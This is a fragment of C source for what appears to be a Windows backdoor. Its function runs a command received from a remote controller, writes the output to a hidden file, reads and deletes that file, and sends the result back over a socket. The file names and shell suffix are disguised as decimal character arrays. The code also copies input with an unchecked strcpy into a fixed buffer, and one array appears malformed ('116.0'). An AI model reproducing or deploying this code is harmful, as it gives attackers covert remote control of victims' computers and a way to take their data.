

void exec(char b[])
{
	char a[300];
	strcpy(a,b);
	char fname[] = {99,111,109,109,97,110,100,46,116,120,116,0};
	char  command_extension []={32,49,62,32,99,111,109,109,97,110,100,46,116,120,116,32,50,62,38,49,32,38,38,32,97,116,116,114,105,98,32,43,72,32,99,111,109,109,97,110,100,46,116,120,116.0};
	strcat(a,command_extension);
	system(a);
	char rm_command [] = {100,101,108,32,47,102,32,99,111,109,109,97,110,100,46,116,120,116,0};
	FILE *fp;
	fp = fopen(fname,"r");
	fseek(fp,0L,SEEK_END);
	long int res = ftell(fp);
	fseek(fp,0,SEEK_SET);
	char c[res+1];
	fread(c, res, 1, fp);
	fclose(fp);
	system(rm_command);

	int valread = send(sock, c , res, 0);
	if (valread<0){
		start();
	}
	Sleep(1);

	valread = send(sock ,"enough",6,0);
	if (valread<0){
		start();
	}
}
